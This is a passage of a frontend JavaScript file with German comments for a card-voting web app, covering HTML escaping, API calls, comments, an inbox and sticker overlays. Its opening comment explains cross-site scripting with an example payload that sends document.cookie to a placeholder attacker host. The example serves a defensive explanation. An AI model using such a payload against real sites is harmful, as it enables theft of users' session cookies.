// zusammen und setzt sie über `element.innerHTML = ...`. Landet darin
// UNVERÄNDERTER Text, den irgendein Nutzer selbst eingegeben hat (Kommentar,
// Nickname, eigener Options-Name bei einer selbsterstellten Karte, ...),
// kann diese Person dort auch HTML-Tags statt normalem Text eintragen –
// z.B. `<img src=x onerror="fetch('https://böse-seite.de?cookie='+document.cookie)">`.
// `innerHTML` würde das nicht als Text anzeigen, sondern als ECHTES HTML
// ausführen. Das nennt man "Cross-Site-Scripting" (XSS): fremder Code läuft
// im Browser ALLER, die sich diese Karte/diesen Kommentar später ansehen –
// besonders gefährlich, sobald Inhalte (wie deine Kommentare) über den
// Server auch an ANDERE Nutzer ausgeliefert werden.
//
// Die Lösung: Bevor ein Nutzertext in einen HTML-String eingebaut wird,
// wandeln wir die 5 Zeichen um, die für einen Browser eine besondere
// Bedeutung haben (<, >, &, ", '), in ihre harmlose Text-Entsprechung um
// (z.B. wird aus "<" das Zeichen "&lt;"). Der Browser zeigt dann exakt den
// eingegebenen Text an (inkl. spitzer Klammern etc.), interpretiert ihn
// aber NICHT mehr als HTML-Code.
//
// WICHTIG: Diese Funktion muss an JEDER Stelle verwendet werden, an der
// Nutzereingaben (nicht: fest einprogrammierte Texte!) in innerHTML landen.
function escapeHtml(value) {
  if (value === null || value === undefined) return '';
  return String(value)
    .replace(/&/g, '&amp;')   // WICHTIG: & zuerst ersetzen, sonst würden die
                               // &amp;/&lt;/... der folgenden Zeilen selbst
                               // nochmal kaputt-escaped werden.
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ==========================================
// BACKEND-ANBINDUNG
// ==========================================
// API_BASE ist die Adresse deines Node-Servers (server.js).
// Im All-in-One Deployment (Express liefert index.html + API aus) reicht ein
// LEERER String: fetch('' + '/api/vote') wird dann automatisch relativ zur
// aktuellen Seite aufgelöst -> funktioniert live UND lokal mit "npm start",
// ganz ohne hartcodierte Domain, die du nach jedem Redeploy pflegen müsstest.
//
// EINZIGE Ausnahme: Wenn du die index.html mit einem SEPARATEN Tool öffnest
// (z.B. VS-Code-Erweiterung "Live Server" auf Port 5500), läuft das Backend
// nicht auf derselben Adresse/demselben Port. Für genau diesen Sonderfall
// erkennen wir "untypische" lokale Ports und lenken dann gezielt auf
// localhost:3000 (den Standardport von server.js) um.
const API_BASE = (() => {
  const { hostname, port } = window.location;
  const isLocalHost = ['localhost', '127.0.0.1'].includes(hostname);
  // Läuft die Seite lokal, aber NICHT schon auf dem Backend-Port (3000)?
  // -> es ist vermutlich ein separates Frontend-Tool wie Live Server.
  const isSeparateDevServer = isLocalHost && port !== '3000' && port !== '';
  return isSeparateDevServer ? 'http://localhost:3000' : '';
})();

// Jedes Gerät bekommt einmalig eine zufällige ID (kein Login nötig). Sie
// wird im localStorage gespeichert und bei jeder Anfrage an den Server
// mitgeschickt, damit der Server "dieses Gerät" wiedererkennt (z.B. für das
// Postfach der Fremdeinschätzungen).
function getDeviceId() {
  let deviceId = localStorage.getItem('kiosk_device_id');
  if (!deviceId) {
    deviceId = (crypto.randomUUID ? crypto.randomUUID() : `dev-${Date.now()}-${Math.random().toString(16).slice(2)}`);
    localStorage.setItem('kiosk_device_id', deviceId);
  }
  return deviceId;
}

// Kleiner Wrapper um fetch(): baut die volle URL, setzt die Header, wandelt
// die Antwort in JSON um und wirft bei Server-Fehlern eine verständliche
// JavaScript-Exception (die wir mit try/catch auffangen können).
async function apiRequest(path, options = {}) {
  const response = await fetch(`${API_BASE}${path}`, {
    headers: { 'Content-Type': 'application/json' },
    ...options
  });

  let data = null;
  try { data = await response.json(); } catch (_) { /* Antwort war kein JSON */ }

  if (!response.ok) {
    const message = (data && data.error) ? data.error : `Serverfehler (${response.status})`;
    throw new Error(message);
  }

  return data;
}

// Stimme abgeben + aktuelle Community-Statistik zurückbekommen.
async function submitVote(topicId, versionId, option) {
  return apiRequest('/api/vote', {
    method: 'POST',
    // nickname wird mitgeschickt, damit der Server die device_id->Nickname-
    // Zuordnung für das Momento-Match-Feature aktuell halten kann (siehe
    // users-Tabelle in server.js) - hat sonst keinen Effekt auf die Stimme.
    body: JSON.stringify({ topicId, versionId, option, deviceId: getDeviceId(), nickname: getStoredNickname() })
  });
}

// Aktuelle Statistik für eine Karte holen (z.B. beim Anzeigen der Karte,
// bevor der Nutzer selbst abgestimmt hat).
async function fetchStats(topicId, versionId) {
  return apiRequest(`/api/stats/${encodeURIComponent(topicId)}/${encodeURIComponent(versionId)}`);
}

// Fremdeinschätzungs-Anfrage anlegen -> liefert eine anonyme shareId für den Link.
async function createEstimateShare(topicId, versionId, creatorName, creatorVal) {
  return apiRequest('/api/estimate', {
    method: 'POST',
    body: JSON.stringify({ topicId, versionId, creatorName, creatorVal, creatorDeviceId: getDeviceId() })
  });
}

// Meta-Infos zu einer Fremdeinschätzungs-Anfrage holen (bewusst OHNE den
// echten Wert – der bleibt bis zur eigenen Antwort verborgen).
async function fetchEstimateMeta(shareId) {
  return apiRequest(`/api/estimate/${encodeURIComponent(shareId)}`);
}

// Eigene Einschätzung abgeben -> Server löst auf und schickt beide Werte zurück.
async function respondToEstimate(shareId, guesserVal) {
  return apiRequest(`/api/estimate/${encodeURIComponent(shareId)}/respond`, {
    method: 'POST',
    body: JSON.stringify({ guesserVal, guesserDeviceId: getDeviceId() })
  });
}

// Holt alle noch UNGELESENEN aufgelösten Fremdeinschätzungen für dieses
// Gerät (also: Freunde haben inzwischen geantwortet, während man selbst
// nicht in der App war).
async function fetchInbox() {
  return apiRequest(`/api/estimate/inbox/${encodeURIComponent(getDeviceId())}`);
}

// Markiert eine Liste von shareIds als "gelesen", damit sie beim nächsten
// Abruf nicht erneut als "neu" auftauchen.
async function ackInbox(shareIds) {
  if (!shareIds || shareIds.length === 0) return;
  return apiRequest(`/api/estimate/inbox/${encodeURIComponent(getDeviceId())}/ack`, {
    method: 'POST',
    body: JSON.stringify({ shareIds })
  });
}

// Lädt ein komplettes Topic-Objekt (mit allen Versionen) zum Server hoch,
// damit Freunde es über einen Share-Link öffnen können, auch wenn es bei
// ihnen lokal noch nie existiert hat. "Fire and forget" gedacht: schlägt
// der Upload fehl (z.B. kein Internet), bleibt die App trotzdem normal
// benutzbar, weil die Karte ja bereits lokal in masterTopics/localStorage
// gespeichert ist – der Nutzer bemerkt vom Fehler nichts.
async function uploadCustomTopicToServer(topic) {
  return apiRequest('/api/topics', {
    method: 'POST',
    body: JSON.stringify(topic)
  });
}

// Holt ein einzelnes Topic-Objekt vom Server (für Deep-Links auf Themen, die
// im eigenen Browser noch unbekannt sind). Wirft eine Exception, wenn das
// Thema nicht existiert (z.B. Link ist abgelaufen/falsch) – das fängt die
// aufrufende Stelle ab.
async function fetchTopicFromServer(topicId) {
  return apiRequest(`/api/topics/${encodeURIComponent(topicId)}`);
}

// ------------------------------------------
// KOMMENTARE ("GEDANKEN")
// ------------------------------------------
// Holt alle gespeicherten Kommentare zu einem Thema vom Server. Wandelt die
// Server-Antwort ins gleiche Format um, das renderMemories() schon immer
// erwartet hat (user/time/text/color), damit der Rest des bestehenden
// Codes unverändert weiterfunktioniert.
async function fetchCommentsFromServer(topicId) {
  const { comments } = await apiRequest(`/api/comments/${encodeURIComponent(topicId)}`);
  return comments.map(c => ({
    id: c.id,
    user: c.user,
    text: c.text,
    time: formatRelativeTime(c.created_at),
    color: "text-retro-accent"
  }));
}

// Speichert einen neuen Kommentar auf dem Server.
async function postCommentToServer(topicId, userName, text) {
  return apiRequest('/api/comments', {
    method: 'POST',
    body: JSON.stringify({ topicId, userName, text, deviceId: getDeviceId() })
  });
}

// Wandelt einen ISO-Zeitstempel vom Server in eine kurze, relative
// Angabe um ("vor 5 Min."), damit es sich nahtlos neben den fest
// einprogrammierten Beispiel-Kommentaren ("vor 10 Min.") einreiht.
function formatRelativeTime(isoString) {
  const then = new Date(isoString + 'Z'); // SQLite datetime('now') ist UTC ohne 'Z'-Suffix
  const diffMs = Date.now() - then.getTime();
  const diffMin = Math.floor(diffMs / 60000);

  if (diffMin < 1) return "Gerade eben";
  if (diffMin < 60) return `vor ${diffMin} Min.`;
  const diffHrs = Math.floor(diffMin / 60);
  if (diffHrs < 24) return `vor ${diffHrs} Std.`;
  const diffDays = Math.floor(diffHrs / 24);
  return `vor ${diffDays} Tag${diffDays === 1 ? '' : 'en'}`;
}

// ------------------------------------------
// MOMENTO-MATCH (echtes Matching per Double-Opt-In)
// ------------------------------------------
// Fragt beim Server nach einem echten Match-Partner für die aktuelle Karte
// (jemand, der dieselbe Option gewählt hat). Ersetzt die bisherige
// Zufallssimulation im Frontend.
async function fetchRealMatch(topicId, versionId) {
  return apiRequest(`/api/momento/match/${encodeURIComponent(topicId)}/${encodeURIComponent(versionId)}?deviceId=${encodeURIComponent(getDeviceId())}`);
}

// Sendet eine Vibe-Anfrage an den gefundenen Match-Partner.
async function sendVibeRequestToServer(topicId, versionId, toDeviceId) {
  return apiRequest('/api/momento/vibe-request', {
    method: 'POST',
    body: JSON.stringify({
      topicId,
      versionId,
      fromDeviceId: getDeviceId(),
      fromNickname: getStoredNickname(),
      toDeviceId
    })
  });
}

// Holt das Vibe-Match-Postfach: eingehende (noch offene) Anfragen UND
// Ergebnis-Benachrichtigungen zu selbst verschickten Anfragen.
async function fetchVibeInbox() {
  return apiRequest(`/api/momento/inbox/${encodeURIComponent(getDeviceId())}`);
}

// Nimmt eine eingehende Vibe-Anfrage an oder lehnt sie ab.
async function respondToVibeRequest(requestId, action) {
  return apiRequest(`/api/momento/vibe-request/${encodeURIComponent(requestId)}/respond`, {
    method: 'POST',
    body: JSON.stringify({ deviceId: getDeviceId(), action })
  });
}

// Markiert Ergebnis-Benachrichtigungen (angenommen/abgelehnt) als gesehen.
async function ackVibeResolutions(requestIds) {
  if (!requestIds || requestIds.length === 0) return;
  return apiRequest('/api/momento/vibe-request/ack', {
    method: 'POST',
    body: JSON.stringify({ deviceId: getDeviceId(), requestIds })
  });
}

// ------------------------------------------
// POSTFACH (Fremdeinschätzungs-Auflösungen UND Vibe-Anfragen)
// ------------------------------------------
// pendingInboxEntries: Fremdeinschätzungs-Auflösungen (bestehend).
// pendingVibeIncoming: NEU - offene Vibe-Anfragen AN mich. Diese sind
// AKTIONSPFLICHTIG (Annehmen/Ablehnen) und bleiben deshalb im Postfach UND
// in der Badge-Zahl sichtbar, bis aktiv reagiert wurde - anders als die
// rein lesenden Einträge, die schon durchs bloße Öffnen als "gelesen"
// gelten.
// pendingVibeResolved: NEU - Ergebnis (angenommen/abgelehnt) zu Anfragen,
// die ICH selbst verschickt habe. Rein informativ, verhält sich wie die
// Fremdeinschätzungs-Einträge (gilt als gelesen, sobald das Postfach
// geöffnet wird).
let pendingInboxEntries = [];
let pendingVibeIncoming = [];
let pendingVibeResolved = [];

// Sucht Topic-Titel + Kartentyp anhand der gespeicherten IDs. Läuft rein
// lokal (keine Server-Anfrage), weil masterTopics ja schon im Browser liegt.
function findTopicAndVersion(topicId, versionId) {
  const topic = masterTopics.find(t => t.id === topicId);
  if (!topic) return { topicTitle: 'Unbekanntes Thema', version: null };
  const version = topic.versions.find(v => v.id === versionId) || null;
  return { topicTitle: topic.title, version };
}

// Badge-Zahl im Header aktualisieren (versteckt sich automatisch bei 0).
function updateInboxBadge(count) {
  const badge = document.getElementById('inbox-badge');
  if (!badge) return;
  if (count > 0) {
    badge.textContent = count > 9 ? '9+' : String(count);
    badge.classList.remove('hidden');
  } else {
    badge.classList.add('hidden');
  }
}

// Fragt beim Server nach neuen Antworten UND neuen Vibe-Anfragen. Wird beim
// App-Start, nach jeder eigenen Stimme und regelmäßig im Hintergrund
// aufgerufen ("Polling" – die einfache Variante von Push-Benachrichtigungen:
// die App fragt aktiv nach, statt dass der Server von sich aus etwas schickt).
//
// RACE-CONDITION-SCHUTZ: pollInbox() kann aus drei unabhängigen Quellen
// ausgelöst werden (Timer alle 60s, "Tab wieder aktiv"-Event, nach einer
// eigenen Stimme) - die könnten sich theoretisch zeitlich überlappen, wenn
// eine vorherige Anfrage noch nicht fertig ist. Ohne Schutz könnte dann die
// ÄLTERE Anfrage zufällig NACH der neueren beim Server ankommen und so
// aktuellere Daten wieder mit veralteten überschreiben. isPollingInbox
// sorgt dafür, dass immer nur eine Anfrage gleichzeitig unterwegs ist.
let isPollingInbox = false;

async function pollInbox() {
  if (isPollingInbox) return; // Es läuft schon eine Anfrage -> diese hier überspringen.
  isPollingInbox = true;

  try {
    // Beide Abfragen parallel starten (Promise.all), statt nacheinander zu
    // warten - spart spürbar Zeit, da beide Server-Anfragen unabhängig
    // voneinander sind.
    const [estimateResult, vibeResult] = await Promise.all([
      fetchInbox(),
      fetchVibeInbox()
    ]);

    pendingInboxEntries = estimateResult.results || [];
    pendingVibeIncoming = vibeResult.incoming || [];
    pendingVibeResolved = vibeResult.resolved || [];

    updateInboxBadge(pendingInboxEntries.length + pendingVibeIncoming.length + pendingVibeResolved.length);
  } catch (err) {
    // Fehler beim Polling sollen die App nie stören (z.B. kurz kein Internet).
    console.warn('Postfach konnte nicht abgerufen werden:', err.message);
  } finally {
    isPollingInbox = false;
  }
}

// Baut die Liste im Panel aus allen drei Quellen. Reihenfolge bewusst so
// gewählt, dass AKTIONSPFLICHTIGE Einträge (offene Vibe-Anfragen) ganz oben
// stehen, danach Ergebnisse zu eigenen Anfragen, zuletzt die
// Fremdeinschätzungs-Auflösungen.
function renderInboxList() {
  const list = document.getElementById('inbox-list');
  const emptyHint = document.getElementById('inbox-empty-hint');
  if (!list || !emptyHint) return;

  list.innerHTML = '';
  const totalCount = pendingInboxEntries.length + pendingVibeIncoming.length + pendingVibeResolved.length;

  if (totalCount === 0) {
    emptyHint.classList.remove('hidden');
    return;
  }
  emptyHint.classList.add('hidden');

  // 1) Offene Vibe-Anfragen: AKTIONSPFLICHTIG (Annehmen/Ablehnen-Buttons).
  pendingVibeIncoming.forEach(entry => {
    const { topicTitle, version } = findTopicAndVersion(entry.topic_id, entry.version_id);
    const sticker = version ? (version.sticker || '⚡') : '⚡';

    const item = document.createElement('div');
    item.className = 'bg-retro-accent/10 border border-retro-accent/40 rounded-2xl p-3 text-left space-y-2';
    item.innerHTML = `
      <div class="flex items-center gap-2">
        <span class="text-lg" aria-hidden="true">${escapeHtml(sticker)}</span>
        <span class="text-xs font-black text-retro-text">${escapeHtml(topicTitle)}</span>
      </div>
      <p class="text-[11px] text-retro-muted">
        <strong class="text-retro-accent">@${escapeHtml(entry.from_nickname)}</strong> hat denselben Vibe wie du und möchte connecten!
      </p>
      <div class="flex gap-2">
        <button type="button" class="flex-1 py-1.5 rounded-xl bg-retro-accent text-white text-xs font-bold active:scale-95 transition-all">Annehmen</button>
        <button type="button" class="flex-1 py-1.5 rounded-xl bg-retro-subtle border border-retro-border text-retro-muted text-xs font-bold active:scale-95 transition-all">Ablehnen</button>
      </div>
    `;
    const [acceptBtn, declineBtn] = item.querySelectorAll('button');
    acceptBtn.onclick = () => handleVibeRequestResponse(entry.id, 'accept');
    declineBtn.onclick = () => handleVibeRequestResponse(entry.id, 'decline');
    list.appendChild(item);
  });

  // 2) Ergebnisse zu SELBST verschickten Anfragen: nur informativ.
  pendingVibeResolved.forEach(entry => {
    const { topicTitle } = findTopicAndVersion(entry.topic_id, entry.version_id);
    const accepted = entry.status === 'accepted';

    const item = document.createElement('div');
    item.className = `bg-retro-subtle/60 border rounded-2xl p-3 text-left space-y-1 ${accepted ? 'border-emerald-500/40' : 'border-retro-border'}`;
    item.innerHTML = `
      <div class="flex items-center gap-2">
        <span class="text-lg" aria-hidden="true">${accepted ? '✅' : '💭'}</span>
        <span class="text-xs font-black text-retro-text">${escapeHtml(topicTitle)}</span>
      </div>
      <p class="text-[11px] text-retro-muted">
        ${accepted
          ? `<strong class="text-emerald-500">@${escapeHtml(entry.to_nickname)}</strong> hat deine Vibe-Anfrage angenommen! 🎉`
          : `<strong class="text-retro-text">@${escapeHtml(entry.to_nickname)}</strong> hat deine Vibe-Anfrage leider abgelehnt.`}
      </p>
    `;
    list.appendChild(item);
  });

  // 3) Fremdeinschätzungs-Auflösungen (bestehend, unverändert).
  pendingInboxEntries.forEach(entry => {
    const { topicTitle, version } = findTopicAndVersion(entry.topic_id, entry.version_id);
    const sticker = version ? (version.sticker || '🎯') : '🎯';

    const item = document.createElement('div');
    item.className = 'bg-retro-subtle/60 border border-retro-border rounded-2xl p-3 text-left space-y-1.5';
    item.innerHTML = `
      <div class="flex items-center gap-2">
        <span class="text-lg" aria-hidden="true">${escapeHtml(sticker)}</span>
        <span class="text-xs font-black text-retro-text">${escapeHtml(topicTitle)}</span>
      </div>
      <div class="flex items-center justify-between text-[11px] gap-2">
        <span class="text-retro-muted">Du dachtest: <strong class="text-retro-text">${escapeHtml(entry.creator_val)}</strong></span>
        <span class="text-retro-accent font-bold">Freund/in: ${escapeHtml(entry.guesser_val)}</span>
      </div>
    `;
    list.appendChild(item);
  });
}

// Klick auf "Annehmen"/"Ablehnen" bei einer eingehenden Vibe-Anfrage.
// Nach dem Server-Update wird der Eintrag aus der lokalen Liste entfernt
// und alles neu gerendert - fühlt sich unmittelbar an, ohne auf das nächste
// Polling-Intervall warten zu müssen.
async function handleVibeRequestResponse(requestId, action) {
  try {
    const result = await respondToVibeRequest(requestId, action);
    pendingVibeIncoming = pendingVibeIncoming.filter(e => e.id !== requestId);
    renderInboxList();
    updateInboxBadge(pendingInboxEntries.length + pendingVibeIncoming.length + pendingVibeResolved.length);

    if (action === 'accept') {
      // Kurzes Feedback, MIT WEM man jetzt "verbunden" ist - bewusst nur der
      // App-Nickname, keine echten Kontaktdaten (siehe Erklärung zum Feature).
      alert(`🎉 Match bestätigt! Du bist jetzt mit @${result.fromNickname} verbunden.`);
    }
  } catch (err) {
    alert(`Konnte nicht gespeichert werden: ${err.message}`);
  }
}

// Panel öffnen: Liste anzeigen und die REIN LESENDEN Einträge (Fremd-
// einschätzungs-Auflösungen + Ergebnisse eigener Vibe-Anfragen) als gelesen
// markieren. Offene Vibe-ANFRAGEN bleiben bewusst ungelesen/aktionspflichtig
// stehen, bis wirklich Annehmen oder Ablehnen angetippt wurde.
async function toggleInboxPanel() {
  const overlay = document.getElementById('inbox-overlay');
  if (!overlay) return;

  renderInboxList();
  overlay.classList.remove('hidden');

  const ackTasks = [];

  if (pendingInboxEntries.length > 0) {
    const idsToAck = pendingInboxEntries.map(e => e.id);
    ackTasks.push(ackInbox(idsToAck).then(() => { pendingInboxEntries = []; }));
  }
  if (pendingVibeResolved.length > 0) {
    const idsToAck = pendingVibeResolved.map(e => e.id);
    ackTasks.push(ackVibeResolutions(idsToAck).then(() => { pendingVibeResolved = []; }));
  }

  if (ackTasks.length > 0) {
    try {
      await Promise.all(ackTasks);
      // Vibe-Anfragen NICHT mitzählen-auf-0: die bleiben ja weiterhin
      // aktionspflichtig offen, solange nicht geantwortet wurde.
      updateInboxBadge(pendingVibeIncoming.length);
    } catch (err) {
      console.warn('Postfach-Einträge konnten nicht als gelesen markiert werden:', err.message);
    }
  }
}

function closeInboxPanel() {
  const overlay = document.getElementById('inbox-overlay');
  if (overlay) overlay.classList.add('hidden');
}

// ------------------------------------------
// LIVE-STATISTIKEN
// ------------------------------------------
// Ersetzt die bisherigen, fest in den Topic-Daten einprogrammierten Werte
// (opt.percent, version.stats.communityAverage) durch echte Zahlen vom
// Server – sobald sie geladen sind. Bis dahin (oder falls der Server gerade
// nicht erreichbar ist) wird einfach der bisherige Startwert angezeigt,
// damit die App nie "leer" oder kaputt aussieht.
let liveStatsCache = {};

function statsCacheKey(topicId, versionId) {
  return `${topicId}::${versionId}`;
}

// Lädt die aktuelle Statistik im Hintergrund und zeichnet die Karte neu,
// falls der Nutzer inzwischen nicht schon weitergewischt hat.
async function refreshLiveStats(topic, version) {
  try {
    const stats = await fetchStats(topic.id, version.id);
    liveStatsCache[statsCacheKey(topic.id, version.id)] = stats;

    const stillOnSameCard = filteredTopics[currentTopicIndex] && filteredTopics[currentTopicIndex].id === topic.id &&
      filteredTopics[currentTopicIndex].versions[currentVersionIndex] &&
      filteredTopics[currentTopicIndex].versions[currentVersionIndex].id === version.id;

    if (stillOnSameCard) {
      const voteKey = `kiosk_vote_${topic.id}_${version.id}`;
      renderOptions(topic, version, localStorage.getItem(voteKey));
    }
  } catch (err) {
    // Kein Backend erreichbar (offline, Server schläft, noch nicht deployed)?
    // Dann bleibt einfach die zuletzt bekannte/eingebaute Statistik stehen.
    console.warn('Live-Statistik konnte nicht geladen werden:', err.message);
  }
}

// Prozentwert für eine Trilemma-Option: nutzt Live-Daten, falls vorhanden,
// sonst den fest einprogrammierten Startwert aus den Topic-Daten.
function getLiveChoicePercent(topic, version, optionName, fallbackPercent) {
  const cached = liveStatsCache[statsCacheKey(topic.id, version.id)];
  if (!cached || !cached.total) return fallbackPercent;

  const match = cached.counts.find(c => c.value === optionName);
  const count = match ? match.count : 0;
  return `${Math.round((count / cached.total) * 100)}%`;
}

// Durchschnittswert für eine Skala: nutzt Live-Daten, falls vorhanden, sonst
// den fest einprogrammierten Startwert.
function getLiveVersusAverage(topic, version, fallbackAverage) {
  const cached = liveStatsCache[statsCacheKey(topic.id, version.id)];
  if (!cached || cached.average === null || cached.average === undefined || !cached.total) {
    return fallbackAverage;
  }
  return cached.average;
}

let selectedTemplateType = "heute";
let isFlipped = false;
// Aktueller Drehwinkel der Karte in Grad
let cardRotationY = 0;

// ============================================================================
// HAPTISCHES FEEDBACK (Vibration API)
// ============================================================================
// Was ist das? Ein kurzer Vibrationsimpuls beim Tippen (wie bei einer
// physischen Taste), der Interaktionen "snappy" wirken lässt.
// Warum so vorsichtig gebaut? navigator.vibrate() gibt es NUR auf
// Android-Browsern. iOS Safari kennt diese Funktion bis heute (2026) gar
// nicht - dort ist navigator.vibrate schlicht "undefined". Der
// typeof-Check unten sorgt dafür, dass auf iOS einfach nichts passiert
// (kein Fehler, kein Crash), statt dass die App dort abstürzt.
// pattern: entweder eine einzelne Zahl in Millisekunden (z.B. 12 = ein
// kurzer Tick) oder ein Array für Muster mit Pausen (z.B. [10, 40, 12] =
// vibrieren-pausieren-vibrieren, fühlt sich wie ein kleiner "Erfolg" an).
function hapticFeedback(pattern = 12) {
  try {
    if (typeof navigator !== 'undefined' && typeof navigator.vibrate === 'function') {
      navigator.vibrate(pattern);
    }
  } catch (e) {
    // Vibration ist reines "Nice-to-have" -> ein Fehler hier darf niemals
    // die eigentliche App-Funktion (Voten, Flippen, ...) stören.
  }
}

// HELPER FOR LUCIDE ICONS
function safeCreateIcons() {
  if (typeof lucide !== 'undefined' && lucide.createIcons) {
    lucide.createIcons();
  }
}

// 3D-KARTEN UMDREHUNG STEUERN (Unterstützt Wisch-Richtungen)
window.toggleFlip = function(direction = 'right') {
  const flipper = document.getElementById('card-flipper');
  if (!flipper) return;
  isFlipped = !isFlipped;

  // Kurzer, spürbarer Impuls beim Umdrehen der Karte (etwas länger als ein
  // normaler Tap, weil es eine größere, "physischere" Bewegung ist).
  hapticFeedback(15);

  cardRotationY += (direction === 'left') ? -180 : 180;
  flipper.style.transform = `rotateY(${cardRotationY}deg)`;

  trackEvent("card_flip", { to: isFlipped ? "back" : "front", direction });
};

// DYNAMISCHE OVERLAY RENDERER
function initVibeOverlay() {
  const grid = document.getElementById('vibe-overlay-grid');
  if (!grid) return;
  grid.innerHTML = '';
  
  Object.keys(vibes).forEach(vKey => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = `aspect-square rounded-2xl ${vibes[vKey]} border border-retro-border/20 active:scale-95 transition-all flex flex-col items-center justify-end p-2 text-center shadow relative overflow-hidden`;
    btn.onclick = () => selectVibeFromOverlay(vKey);
    
    btn.innerHTML = `
      <div class="absolute inset-0 bg-black/10 opacity-0 hover:opacity-100 transition-opacity"></div>
      <span class="text-sm font-black text-white bg-black/40 px-1.5 py-0.5 rounded-full select-none leading-none truncate max-w-[95%]">${vibeFriendlyNames[vKey] || vKey}</span>
    `;
    grid.appendChild(btn);
  });
}

// Merkt sich, welche Kategorie im Overlay gerade aktiv/sichtbar ist.
let activeStickerCategoryIndex = 0;

function initStickerOverlay() {
  const tabsContainer = document.getElementById('sticker-overlay-tabs');
  const gridContainer = document.getElementById('sticker-overlay-grid');
  if (!tabsContainer || !gridContainer) return;

  // Aktuellen Sticker-Wert der Karte ermitteln, damit beim Öffnen direkt
  // die passende Kategorie aktiv ist (falls der Sticker aus der Bibliothek
  // stammt) und der Sticker selbst als "ausgewählt" markiert erscheint.
  const currentValue = document.getElementById('create-sticker')?.value || '';
  const matchingCategoryIndex = categorizedStickers.findIndex(cat => cat.items.includes(currentValue));
  activeStickerCategoryIndex = matchingCategoryIndex !== -1 ? matchingCategoryIndex : 0;

  renderStickerTabs();
  renderStickerGrid();
}

// Baut die Kategorie-Reiter EINMAL auf. Jeder Reiter zeigt nur das Icon aus
// dem Kategorienamen (z.B. "🎮"), damit auch bei 6+ Kategorien alles
// kompakt in einer Reihe Platz hat - der volle Name steht als Tooltip/
// Screenreader-Text im aria-label.
function renderStickerTabs() {
  const tabsContainer = document.getElementById('sticker-overlay-tabs');
  if (!tabsContainer) return;
  tabsContainer.innerHTML = '';

  categorizedStickers.forEach((cat, index) => {
    const icon = cat.name.split(' ')[0];
    const label = cat.name.split(' ').slice(1).join(' ');

    const tab = document.createElement('button');
    tab.type = 'button';
    tab.setAttribute('aria-label', label);
    tab.className = getStickerTabClasses(index === activeStickerCategoryIndex);
    tab.innerText = icon;
    tab.onclick = () => {
      activeStickerCategoryIndex = index;
      renderStickerTabs(); // Hervorhebung des aktiven Reiters aktualisieren
      renderStickerGrid();
    };
    tabsContainer.appendChild(tab);
  });
}

function getStickerTabClasses(isActive) {
  const base = 'shrink-0 w-11 h-11 text-xl rounded-xl border transition-all flex items-center justify-center select-none';
  return isActive
    ? `${base} bg-retro-accent border-retro-accent shadow-md scale-105`
    : `${base} bg-retro-subtle/50 border-retro-border/40 hover:border-retro-accent`;
}

// Zeichnet das Sticker-Raster NUR für die aktuell aktive Kategorie. Ganz
// normales, umbrechendes Grid (kein Wischen mehr nötig).
//
// HÖHENBEGRENZUNG AUF 5 ZEILEN: Bei 6 Spalten sind das 30 Sticker, die ohne
// Scrollen sichtbar sind - passt eine Kategorie NICHT komplett rein, wird
// NUR dieses eine Raster (nicht das ganze Overlay) intern scrollbar, mit
// einem sanften Fade-Out am unteren Rand als visueller Hinweis "hier geht's
// weiter". Die Höhe wird bewusst per JavaScript aus der TATSÄCHLICHEN
// Button-Größe berechnet (nicht als fester Pixel-/rem-Wert in Tailwind) -
// Handybildschirme sind unterschiedlich breit, wodurch auch die Buttons
// (die sich die Breite automatisch teilen) unterschiedlich groß ausfallen.
// Ein fester Wert wäre auf manchen Handys zu knapp, auf anderen zu großzügig.
function renderStickerGrid() {
  const gridContainer = document.getElementById('sticker-overlay-grid');
  if (!gridContainer) return;
  gridContainer.innerHTML = '';
  // Vor jedem Neuaufbau zurücksetzen, damit eine alte Höhenbegrenzung nicht
  // an einer neuen, kürzeren Kategorie hängen bleibt.
  gridContainer.style.maxHeight = '';
  gridContainer.classList.remove('overflow-y-auto', 'no-scrollbar', 'sticker-grid-fade');

  const currentValue = document.getElementById('create-sticker')?.value || '';
  const activeCategory = categorizedStickers[activeStickerCategoryIndex];
  if (!activeCategory) return;

  activeCategory.items.forEach(sticker => {
    const btn = document.createElement('button');
    btn.type = 'button';
    btn.className = getStickerButtonClasses(sticker === currentValue);
    btn.innerText = sticker;
    // Einzelauswahl: ein Tap wählt den Sticker SOFORT aus und schließt
    // das Overlay direkt - kein zusätzlicher Bestätigungs-Schritt nötig.
    btn.onclick = () => selectSticker(sticker);
    gridContainer.appendChild(btn);
  });

  // Erst NACHDEM die Buttons im DOM sind, können wir ihre echte Höhe messen
  // (vorher wäre der Container leer und die Messung sinnlos).
  const ROWS_VISIBLE = 5;
  const COLUMNS = 6;
  if (activeCategory.items.length > ROWS_VISIBLE * COLUMNS) {
    const firstButton = gridContainer.querySelector('button');
    if (firstButton) {
      const buttonHeight = firstButton.offsetHeight;
      // "gap-2" in Tailwind entspricht 0.5rem = 8px Abstand zwischen den
      // Zeilen; zwischen 5 sichtbaren Zeilen liegen 4 solcher Abstände.
      const gapPx = 8;
      const maxHeight = (buttonHeight * ROWS_VISIBLE) + (gapPx * (ROWS_VISIBLE - 1));
      gridContainer.style.maxHeight = `${maxHeight}px`;
      gridContainer.classList.add('overflow-y-auto', 'no-scrollbar', 'sticker-grid-fade');
    }
  }
}

// Baut die CSS-Klassen für einen Sticker-Button, abhängig davon, ob er dem
// AKTUELL auf der Karte hinterlegten Sticker entspricht (dann farbig
// hervorgehoben) oder nicht.
function getStickerButtonClasses(isSelected) {
  const base = 'w-full aspect-square text-2xl rounded-xl border transition-all text-center select-none flex items-center justify-center';
  return isSelected
    ? `${base} bg-retro-accent/25 border-retro-accent scale-95`
    : `${base} border-transparent hover:bg-retro-accent/15 hover:border-retro-accent active:scale-95`;
}

// Übernimmt genau EINEN Sticker in die Karte und schließt das Overlay
// direkt - pro Karte ist immer nur ein Sticker vorgesehen.
function selectSticker(sticker) {
  const input = document.getElementById('create-sticker');
  if (input) input.value = sticker;
  updateStickerPreview(sticker);
  closeStickerOverlay();
}

// OVERLAY EVENT HANDLERS
function openVibeOverlay() {
  const overlay = document.getElementById('vibe-overlay');
  if (overlay) overlay.classList.remove('hidden');
  initVibeOverlay();
}

function closeVibeOverlay() {
  const overlay = document.getElementById('vibe-overlay');
  if (overlay) overlay.classList.add('hidden');
}

function selectVibeFromOverlay(vibeKey) {
  const input = document.getElementById('create-vibe');
  if (input) input.value = vibeKey;
  
